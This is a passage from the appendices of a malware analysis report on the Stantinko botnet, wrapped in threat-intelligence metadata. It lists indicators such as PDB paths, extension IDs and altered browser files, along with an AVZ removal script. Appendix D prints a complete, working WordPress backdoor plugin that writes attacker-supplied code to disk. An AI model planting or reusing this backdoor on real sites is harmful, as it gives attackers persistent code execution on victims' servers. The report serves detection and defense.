HKLM\\SOFTWARE\\Classes\\[0-9A-F]{4}.FieldListCtrl.1\\\n   HKLM\\SOFTWARE\\Classes\\[0-9A-F]{4}.CoreClass.2\\\n\n```\nPDB paths\n```\n   D:\\work\\brut\\cms\\facebook\\facebookbot\\Release\\facebookbot.pdb\n   D:\\work\\service\\plugins\\Release\\get_hdd_serial_number.pdb\n   D:\\work\\service\\plugins\\Release\\remove_plugins_installer.pdb\n   D:\\work\\service\\plugins\\Release\\remove_zaxar.pdb\n   D:\\work\\service\\plugins\\Release\\reset_safesurfing_flag.pdb\n   D:\\work\\service\\service\\Release\\bstreamsvc.pdb\n   D:\\work\\service\\service\\Release\\bstreamsvc_setup.pdb\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\n   D:\\work\\service\\service\\Release DRTIPROV\\ir16_32.pdb\n   D:\\work\\service\\service\\Release\\first_service.pdb\n   D:\\work\\service\\service\\Release\\first_service_setup.pdb\n   D:\\work\\service\\service\\Release\\ihctrl32.pdb\n   D:\\work\\service\\service\\Release\\ihctrl32_setup.pdb\n   D:\\work\\service\\service\\Release\\ir16_32.pdb\n   D:\\work\\service\\service\\Release\\optsatadc.pdb\n   D:\\work\\service\\service\\Release\\optsatadc_setup.pdb\n   D:\\work\\service\\service\\Release\\themctrl.pdb\n   D:\\work\\service\\service\\Release\\themctrl_setup.pdb\n   D:\\work\\service\\service\\Release\\wbiosrvp_setup.pdb\n   D:\\work\\service\\service\\Release\\wsaudio_setup.pdb\n   D:\\work\\ultdr\\udsetup\\Release\\udsetup_winapi_morphed.pdb\n   Z:\\source\\service\\Release\\ir16_32.pdb\n   Z:\\source\\service\\Release\\setup_serv.pdb\n\n###### A.4. FileTour Related Browser Extensions\n\n```\n```\nmokpognidnibahjeehkdhmkdbgabfkep\nloomomcdgnodjphdehpoanlofjmeokke\nccimlhmlgnkjempcghlabllkbgdpjagk\nhfpaelefmfpfdmjiecdccpmekghdjcap\nifmchoplnlafebjembfaaaildcgdadab\njogagnofhbcgldnmafkhagknogbfloaa\ncpflnioddbhmlchefkmcmeehjpcpiknp\nlebjkfokgcengijgdodopobcbndflcjb\ndehgholebonhipemehadgjoihnjbpgnm\nglbcbgbodmnemnejddpbhcfekfdjgmej\nfedboeonidlcgnflmajfheilcmgiahgf\nicepgilpdfnecncejolijhnognpbgcgd\nihlmbkmmgnhgaagimihfdhegemppnpec\nfckhmicipjghfnoiolefdkafcoaliinf\nigdfoaggcognkghmlgimipmekdmjcbce\nhkmchnencjegegndmipmfejhipafelid\npnlkhjfflffalbikohnkooficoieaedc\ngmaekjobdijleaflgnccechjojghplfe\nihmlfmpkhhcbgbnlgjkkcaclghpolpif\nnibehnlbphofobopalmijhgbgdohendj\ndekaaalblcclbepghohmhjpggimlpcfi\nmkeifhecfglioohhpfhjlgmagmjifglk\nkifmjnjoooklbpnejkbgeeoemkbahgic\npkcjhbglopidnjfdncdkegdhbhfgkilp\nachhckalphdlhbnohjonneffefbmaddi\npgjjlglfnamkhfidnchomgjkjnjhlofo\nfgldnknlljnfcfgchdijbjmmkdkmnabn\nnhkchinogebbapokmlnfbfoglnonminm\npfmlgdpgagephflfijfmhjckammbifgk\nhgociblokhadkfkngfalkcgkaogjahjo\neldcljhecbiffkhpkdedikmaegjpilpe\noelpkepjlgmehajehfeicfbjdiobdkfj\nccfifbojenkenpkmnbnndeadpfdiffof\nojlcebdkbpjdpiligkdbbkdkfjmchbfd\nlbnbblpcickpemfcgmeejknhhohkbbdb\ndhdgffkkebhmkfjojejmpbldmpobfkfo\niindkkipiinfeoppmpjcmmifilkighnp\n\n```\n\nFigure 96. List of extensions that can be installed\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n###### A.5. KBDMAI_ExtInstaller\n\n```\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Secure Preferences\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State\n%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default\\Preferences\n%APPDATA\\Opera Software\\Opera Stable\\Preferences\n%APPDATA\\Opera Software\\Opera Next\\Preferences\n%LOCALAPPDATA%\\Yandex\\Internet\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\Kometa\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\Xpom\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\Nichrome\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\Comodo\\Dragon\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\MapleStudio\\ChromePlus\\User Data\\Default\\\nPreferences\n%LOCALAPPDATA%\\PlayFree Browser\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\uCozMedia\\Uran\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\Torch\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\Orbitum\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\Chromium\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\Bromium\\User Data\\Default\\Preferences\n%LOCALAPPDATA%\\Crossbrowse\\Crossbrowse\\User Data\\Default\\\nPreferences;\n%APPDATA%\\Mozilla\\Firefox\\Profiles\\<profile_dir>\\prefs.js\n%APPDATA%\\Mozilla\\Firefox\\Profiles\\<profile_dir>\\extensions.ini\n%APPDATA%\\Mozilla\\Firefox\\Profiles\\<profile_dir>\\extensions.json\n\n```\n\nFigure 97. Browser files modified by KBDMAI_ExtInstaller\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### APPENDIX B: FILETOUR CLICK-FRAUD  SUBSTITUTION TABLE\n\nThe key is the encrypted character and the value is the corresponding decrypted character.\n```\n   substitution_dict = {34:44,35:45,28:46,29:47,79:97,72:98,73:99,74:100,75:101,68:102,\n   69:103,70:104,71:105,96:106,97:107,98:108,99:109,92:110,93:111,88:114,89:115,90:116,\n   91:117,84:118,85:119,86:120,87:121}\n\n##### APPENDIX C: AVZ SCRIPT\n\n```\n```\nProcedure RemoveMalwareTask(AFileName : string);\nvar\n    ext : string;\nbegin\n    LoadFileToBuffer(AFileName);\n    if SearchSign(‘3C 00 41 00 72 00 67 00 75 00 6D 00 65 00\n6E 00 74 00 73 00 3E 00 68 00 74 00 74 00 70 00 3A 00 2F 00 2F\n00’, 0, 0) >= 0 then\n        DeleteFile(AFileName, ‘32,64’);\n    if SearchSign(‘3C 00 41 00 72 00 67 00 75 00 6D 00 65 00\n6E 00 74 00 73 00 3E 00 68 00 74 00 74 00 70 00 73 00 3A 00 2F 00\n2F 00’, 0, 0) >= 0 then\n        DeleteFile(AFileName, ‘32,64’);\n    ext := LowerCase(ExtractFileExt(AFileName));\n    if (ext = ‘.job’) then\n        begin\n            if SearchSign(‘00 68 00 74 00 74 00 70 00 3A\n00 2F 00 2F 00’, 0, 0) >= 0 then\n                DeleteFile(AFileName, ‘32,64’);\n            if SearchSign(‘00 68 00 74 00 74 00 70 00 73\n00 3A 00 2F 00 2F 00’, 0, 0) >= 0 then\n                DeleteFile(AFileName, ‘32,64’);\n        end;\n    FreeBuffer;\nend;\nprocedure EnumAutorun(Elements : TStrings);\nconst\n     AUTORUN_KEY = ‘\\Software\\Microsoft\\Windows\\CurrentVersion\\\nRun\\’;\nvar\n   user_keys : TStrings;\n   values : TStrings;\n   i, j : Integer;\nbegin\n     user_keys := TStringList.Create;\n     values := TStringList.Create;\n          RegKeyEnumKey(‘HKLM’, ‘SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\ProfileList’, user_keys);\n     for i := 0 to user_keys.Count-1 do\n     begin\n          values.Clear;\n          RegKeyEnumVal(‘HKEY_USERS’, user_keys[i] +\nAUTORUN_KEY, values);\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\n                    for j := 0 to values.Count - 1\ndo\n          begin\n               Elements.Add(user_keys[i] + AUTORUN_KEY +\nvalues[j]);\n          end;\n     end;\n          values.Free;\n     user_keys.Free;\n     end;\nfunction CreateUserDirectoryPath(user : string) : string;\nbegin\n    Result := ExtractFilePath(NormalDir(‘%ProfileDir%’)) + user\n+ ‘\\’;\nend;\nfunction CreateAppDataPathForUser(user : string) : string;\nvar\n    path, users_dir : string;\n    ps : integer;\nbegin\n    users_dir := NormalDir(‘%ProfileDir%’);\n    path := NormalDir(‘%AppData%’);\n    path := Copy(path, Length(users_dir) + 1, Length(path) Length(users_dir) + 1);\n    ps := Pos(‘\\’, path);\n    Result := users_dir + user + Copy(path, ps, Length(path) ps);\nend;\nprocedure RemoveZaxar();\nvar\n    file : string;\n    autorun, user_dirs, files : TStrings;\n    i, j : Integer;\n    val : string;\nbegin\n    TerminateProcessByName(‘ZaxarGameBrowser.exe’);\n    TerminateProcessByName(‘ZaxarLoader.exe’);\n    file := NormalDir(‘%PF%\\Zaxar\\’);\n    DeleteFileMask(file, ‘*.*’, true);\n    DeleteDirectory(file);\n        file := NormalDir(‘%PF% (x86)\\Zaxar\\’);\n    DeleteFileMask(file, ‘*.*’, true);\n    DeleteDirectory(file);\nautorun := TStringList.Create;\n    EnumAutorun(autorun);\n    for i := 0 to autorun.Count - 1 do\n    begin\n         val := LowerCase(RegKeyStrParamRead(‘HKEY_USERS’,\nExtractFilePath(autorun[i]), ExtractFileName(autorun[i])));\n         if (Pos(‘zaxargamebrowser.exe’, val) <> 0) OR\n(Pos(‘zaxarloader.exe’, val) <> 0) then\n         begin\n              RegKeyParamDel(‘HKEY_USERS’,\nExtractFilePath(autorun[i]), ExtractFileName(autorun[i]));\n         end;\n    end;\n    .autorun.Free;\n    user_dirs := TStringList.Create;\n        files := TStringList.Create;\n        SearchFolders(NormalDir(‘%ProfileDir%’), ‘*’, user_\ndirs, false, true);\n        for i := 0 to user_dirs.Count - 1 do\n        begin\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\n            files.Clear;\n            file := CreateAppDataPathForUser(user_\ndirs[i]) + ‘\\Microsoft\\Windows\\Start Menu\\Programs\\’;\n            SearchFiles(file, ‘*.lnk’, files, true,\ntrue);\n            file := file + ‘Startup\\’;\n            SearchFiles(file, ‘*.lnk’, files, true,\ntrue);\n            file := CreateUserDirectoryPath(user_dirs[i])\n+ ‘\\Start Menu\\Programs\\’;\n            SearchFiles(file, ‘*.lnk’, files, true,\ntrue);\n            file := file + ‘Startup\\’;\n            SearchFiles(file, ‘*.lnk’, files, true,\ntrue);\nfor j := 0 to files.Count - 1 do\nbegin\n    file := LowerCase(ExtractFileName(files[j]));\n    if (file = ‘zaxargamebrowser.lnk’) OR (file = ‘zaxarloader.\nlnk’) OR (file = ‘zaxar games browser.lnk’) then\n    DeleteFile(files[j]);\nend;\nend;\n    files.Free;\n    user_dirs.Free;\nend;\nprocedure RemoveMSCInfo();\nvar\n    file : string;\nbegin\n    file := GetServiceFile(‘MSCInfo’);\n    TerminateProcessByName(‘MSCInfo.exe’);\n    StopService(‘MSCInfo’);\n    DeleteService(‘MSCInfo’);\n    file := ExtractFilePath(file);\n    if (file <> ‘’) then\n    begin\n    DeleteFileMask(file, ‘*.*’, true);\n    DeleteDirectory(file);\n    end;\nend;\nprocedure RemoveTasks();\nvar\n    tasks : TStrings;\n    i : integer;\nbegin\n    tasks := TStringList.Create;\n    SetupAVZ(‘X64R=NN’);\n    SearchFiles(‘%System32%\\Tasks’, ‘*.*’, tasks, true, true);\n    SearchFiles(‘%WinDir%\\Tasks’, ‘*.*’, tasks, true, true);\n    for i := 0 to tasks.Count-1 do\n    RemoveMalwareTask(tasks[i]);\n    SetupAVZ(‘X64R=YY’);\n    tasks.Free;\nend;\nbegin\n    RemoveMSCInfo();\n    RemoveZaxar();\n    RemoveTasks();\nExitAVZ;\nend\n\n```\n\nFigure 98. AVZ script to remove Zaxar\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### APPENDIX D: WORDPRESS BACKDOOR\n\n```\n<?php\n%s/*\nPlugin Name: WPUFthing\nPlugin URI: http://wordpress.org/#\nDescription: ***\nAuthor: thing\nVersion: 1.0\nAuthor URI: http://\n*/\n/* Copyright 2015 thing (email: thing666@gmail.com)\n  This program is free software; you can redistribute it and/or\n  modify it under the terms of the GNU General Public License as\n  published by the Free Software Foundation; either version 2 of\n  the License, or (at your option) any later version.\n  This program is distributed in the hope that it will be\n  useful, but WITHOUT ANY WARRANTY; without even the implied\n  warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR\n  PURPOSE. See the GNU General Public License for more details.\n  You should have received a copy of the GNU General Public\n  License along with this program; if not, write to the Free\n  Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n  02110-1301 USA\n*/\nerror_reporting(0);\nif (isset($_POST[‘code’]) && isset($_POST[‘action’]) && isset($_\nPOST[‘name’]))\n{\n  switch( $_POST[‘action’] ) {\n    case ‘save’:\n      $h = @fopen( ‘../’ . $_POST[‘name’], ‘a+’ );\n      if( $h ) {\n        @flock( $h, LOCK_EX );\n        @fwrite( $h, base64_decode( $_POST[‘code’] ) );\n        @flock( $h, LOCK_UN );\n        @fclose( $h );\n      }\n      die( file_exists( ‘../’ . $_POST[‘name’] ) ? ‘OK’ :\n         ‘ERROR’ );\n      break;\n    case ‘remove’:\n      if( file_exists( ‘../’ . $_POST[‘name’] ) ) {\n        @unlink( ‘../’ . $_POST[‘name’] );\n      }\n      die ( file_exists( ‘../’ . $_POST[‘name’] ) ?\n         ‘ERROR’ : ‘OK’ );\n      break;\n        }\n    }\n\n```\n\nFigure 99. WordPress backdoor plugin\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
    ],
    "report_names": [
        "Stantinko.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3fad11c6-4336-4b28-a606-f510eca5452e",
            "created_at": "2022-10-25T16:07:24.346573Z",
            "updated_at": "2025-03-27T02:02:10.183211Z",
            "deleted_at": null,
            "main_name": "Turbine Panda",
            "aliases": [
                "APT 26",
                "Black Vine",
                "Bronze Express",
                "Group 13",
                "JerseyMikes",
                "KungFu Kittens",
                "PinkPanther",
                "Shell Crew",
                "Turbine Panda",
                "WebMasters"
            ],
            "source_name": "ETDA:Turbine Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Hurix",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mivast",
                "PlugX",
                "RbDoor",
                "RedDelta",
                "RibDoor",
                "Sakula",
                "Sakula RAT",
                "Sakurel",
                "Sogu",
                "StreamEx",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Winnti",
                "Xamtrav",
                "cobeacon",
                "ffrat"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "64ca1755-3883-4173-8e0a-6e5cf92faafd",
            "created_at": "2022-10-25T15:50:23.636456Z",
            "updated_at": "2025-03-27T02:00:55.51077Z",
            "deleted_at": null,
            "main_name": "Deep Panda",
            "aliases": [
                "Deep Panda",
                "Shell Crew",
                "KungFu Kittens",
                "PinkPanther",
                "Black Vine"
            ],
            "source_name": "MITRE:Deep Panda",
            "tools": [
                "Mivast",
                "StreamEx",
                "Sakula",
                "Tasklist",
                "Derusbi"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1500508758,
    "ts_modification_date": 1500508767,
    "files": {
        "pdf": "https://archive.orkl.eu/631b71581b957a19a35ead27217b90a6e751895b.pdf",
        "text": "https://archive.orkl.eu/631b71581b957a19a35ead27217b90a6e751895b.txt",
        "img": "https://archive.orkl.eu/631b71581b957a19a35ead27217b90a6e751895b.jpg"
    }
}